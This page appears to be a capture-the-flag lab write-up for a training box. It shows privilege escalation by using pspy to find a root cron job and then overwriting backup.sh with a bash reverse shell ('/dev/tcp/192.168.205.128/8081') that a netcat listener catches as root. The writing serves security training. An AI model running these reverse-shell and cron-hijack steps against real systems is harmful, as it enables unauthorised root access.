@@ -1,0 +1,147 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>pspy</title>
+</head><body>website : <a href="https://github.com/DominicBreuker/pspy ">https://github.com/DominicBreuker/pspy<br/>
+</a><br/>
+will move the file in the root (i.e. in the trasnfer folder)<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# mv /home/kali/Downloads/pspy64 transfer/pspy64<br/>
+<br/>
+Now will download the file in the victim tmp folder (i.e. grimmie shell)<br/>
+$ wget http://192.168.205.128/pspy64<br/>
+--2022-12-07 12:35:52-- http://192.168.205.128/pspy64<br/>
+Connecting to 192.168.205.128:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 3078592 (2.9M) [application/octet-stream]<br/>
+Saving to: 'pspy64'<br/>
+<br/>
+  0K .......... .......... .......... .......... .......... 1% 13.6M 0s<br/>
+  50K .......... .......... .......... .......... .......... 3% 20.3M 0s<br/>
+ 100K .......... .......... .......... .......... .......... 4% 53.2M 0s<br/>
+ 150K .......... .......... .......... .......... .......... 6% 129M 0s<br/>
+ 200K .......... .......... .......... .......... .......... 8% 168M 0s<br/>
+ 250K .......... .......... .......... .......... .......... 9% 23.0M 0s<br/>
+ 300K .......... .......... .......... .......... .......... 11% 20.3M 0s<br/>
+ 350K .......... .......... .......... .......... .......... 13% 39.0M 0s<br/>
+ 400K .......... .......... .......... .......... .......... 14% 25.1M 0s<br/>
+ 450K .......... .......... .......... .......... .......... 16% 36.7M 0s<br/>
+ 500K .......... .......... .......... .......... .......... 18% 23.3M 0s<br/>
+ 550K .......... .......... .......... .......... .......... 19% 53.6M 0s<br/>
+ 600K .......... .......... .......... .......... .......... 21% 35.5M 0s<br/>
+ 650K .......... .......... .......... .......... .......... 23% 230M 0s<br/>
+ 700K .......... .......... .......... .......... .......... 24% 224M 0s<br/>
+ 750K .......... .......... .......... .......... .......... 26% 122M 0s<br/>
+ 800K .......... .......... .......... .......... .......... 28% 384M 0s<br/>
+ 850K .......... .......... .......... .......... .......... 29% 88.2M 0s<br/>
+ 900K .......... .......... .......... .......... .......... 31% 108M 0s<br/>
+ 950K .......... .......... .......... .......... .......... 33% 291M 0s<br/>
+ 1000K .......... .......... .......... .......... .......... 34% 85.1M 0s<br/>
+ 1050K .......... .......... .......... .......... .......... 36% 161M 0s<br/>
+ 1100K .......... .......... .......... .......... .......... 38% 334M 0s<br/>
+ 1150K .......... .......... .......... .......... .......... 39% 41.8M 0s<br/>
+ 1200K .......... .......... .......... .......... .......... 41% 35.3M 0s<br/>
+ 1250K .......... .......... .......... .......... .......... 43% 47.5M 0s<br/>
+ 1300K .......... .......... .......... .......... .......... 44% 37.5M 0s<br/>
+ 1350K .......... .......... .......... .......... .......... 46% 26.5M 0s<br/>
+ 1400K .......... .......... .......... .......... .......... 48% 42.4M 0s<br/>
+ 1450K .......... .......... .......... .......... .......... 49% 56.3M 0s<br/>
+ 1500K .......... .......... .......... .......... .......... 51% 68.1M 0s<br/>
+ 1550K .......... .......... .......... .......... .......... 53% 103M 0s<br/>
+ 1600K .......... .......... .......... .......... .......... 54% 69.5M 0s<br/>
+ 1650K .......... .......... .......... .......... .......... 56% 90.8M 0s<br/>
+ 1700K .......... .......... .......... .......... .......... 58% 466M 0s<br/>
+ 1750K .......... .......... .......... .......... .......... 59% 109M 0s<br/>
+ 1800K .......... .......... .......... .......... .......... 61% 419M 0s<br/>
+ 1850K .......... .......... .......... .......... .......... 63% 249M 0s<br/>
+ 1900K .......... .......... .......... .......... .......... 64% 94.5M 0s<br/>
+ 1950K .......... .......... .......... .......... .......... 66% 125M 0s<br/>
+ 2000K .......... .......... .......... .......... .......... 68% 110M 0s<br/>
+ 2050K .......... .......... .......... .......... .......... 69% 109M 0s<br/>
+ 2100K .......... .......... .......... .......... .......... 71% 107M 0s<br/>
+ 2150K .......... .......... .......... .......... .......... 73% 92.0M 0s<br/>
+ 2200K .......... .......... .......... .......... .......... 74% 102M 0s<br/>
+ 2250K .......... .......... .......... .......... .......... 76% 106M 0s<br/>
+ 2300K .......... .......... .......... .......... .......... 78% 63.8M 0s<br/>
+ 2350K .......... .......... .......... .......... .......... 79% 40.5M 0s<br/>
+ 2400K .......... .......... .......... .......... .......... 81% 40.0M 0s<br/>
+ 2450K .......... .......... .......... .......... .......... 83% 54.7M 0s<br/>
+ 2500K .......... .......... .......... .......... .......... 84% 67.0M 0s<br/>
+ 2550K .......... .......... .......... .......... .......... 86% 41.6M 0s<br/>
+ 2600K .......... .......... .......... .......... .......... 88% 51.6M 0s<br/>
+ 2650K .......... .......... .......... .......... .......... 89% 63.8M 0s<br/>
+ 2700K .......... .......... .......... .......... .......... 91% 44.5M 0s<br/>
+ 2750K .......... .......... .......... .......... .......... 93% 68.2M 0s<br/>
+ 2800K .......... .......... .......... .......... .......... 94% 48.5M 0s<br/>
+ 2850K .......... .......... .......... .......... .......... 96% 50.2M 0s<br/>
+ 2900K .......... .......... .......... .......... .......... 98% 51.8M 0s<br/>
+ 2950K .......... .......... .......... .......... .......... 99% 30.9M 0s<br/>
+ 3000K ......                        100% 25.6M=0.05s<br/>
+<br/>
+2022-12-07 12:35:52 (54.2 MB/s) - 'pspy64' saved [3078592/3078592]<br/>
+<br/>
+$ ls<br/>
+linpeas.sh<br/>
+pspy<br/>
+$chmod +x pspy64<br/>
+$./pspy64<br/>
+<br/>
+2022/12/07 12:37:58 CMD: UID=0  PID=12982 | sshd: grimmie [priv] <br/>
+2022/12/07 12:37:58 CMD: UID=0  PID=12921 | <br/>
+2022/12/07 12:37:58 CMD: UID=0  PID=12   | <br/>
+2022/12/07 12:37:58 CMD: UID=0  PID=11   | <br/>
+2022/12/07 12:37:58 CMD: UID=0  PID=10   | <br/>
+2022/12/07 12:37:58 CMD: UID=0  PID=1   | /sbin/init <br/>
+2022/12/07 12:38:01 CMD: UID=0  PID=13232 | /usr/sbin/CRON -f <br/>
+2022/12/07 12:38:01 CMD: UID=0  PID=13233 | /usr/sbin/CRON -f <br/>
+2022/12/07 12:38:01 CMD: UID=0  PID=13234 | /bin/sh -c /home/grimmie/backup.sh <br/>
+2022/12/07 12:38:01 CMD: UID=0  PID=13235 | /bin/bash /home/grimmie/backup.sh <br/>
+2022/12/07 12:38:01 CMD: UID=0  PID=13236 | /bin/bash /home/grimmie/backup.sh <br/>
+2022/12/07 12:38:01 CMD: UID=0  PID=13237 | /bin/bash /home/grimmie/backup.sh <br/>
+<br/>
+so we have confirmed that backup.sh is running on timmer using the pspy64 so will be abusing this in our favour<br/>
+<br/>
+grimmie@academy:/tmp$ cd /home/grimmie<br/>
+grimmie@academy:~$ ls<br/>
+backup.sh<br/>
+<br/>
+Google bash reverse shell one liner which will take us to reverse shell cheat sheet from Pentestmonkey.<br/>
+<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br/>
+Command : bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br/>
+<br/>
+But will modify it and will use the attacker ip which is 192.168.205.128 in our case and will also change the port to 8081 cuz 8080 might be already in use.<br/>
+So as our hun was right as the script as running every minute and we got the root shell on the listner we were listening.<br/>
+Note: I have deleted the shebang (i.e. #!/bin/bash) <br/>
+so the script was not running and if run the script manually than will get the grimmie shell and not the root shell.<br/>
+<br/>
+grimmie@academy:~$ cat backup.sh                                        <br/>
+#!/bin/bash<br/>
+<br/>
+bash -i &gt;&amp; /dev/tcp/192.168.205.128/8081 0&gt;&amp;1<br/>
+grimmie@academy:~$ <br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -nvlp 8081<br/>
+listening on [any] 8081 ...<br/>
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 38838<br/>
+bash: cannot set terminal process group (1217): Inappropriate ioctl for device<br/>
+bash: no job control in this shell<br/>
+root@academy:~# whoami<br/>
+whoami<br/>
+root<br/>
+root@academy:~# cd /root<br/>
+cd /root<br/>
+root@academy:~# ls<br/>
+ls<br/>
+flag.txt<br/>
+root@academy:~# cat flag.txt  <br/>
+cat flag.txt<br/>
+Congratz you rooted this box !<br/>
+Looks like this CMS isn't so secure...<br/>
+I hope you enjoyed it.<br/>
+If you had any issue please let us know in the course discord.<br/>
+<br/>
+Happy hacking !<br/>
+root@academy:~# <br/>
+<br/>
+<img height="290" src="screenshot_20221208_051157.png" width="500"/></body></html>
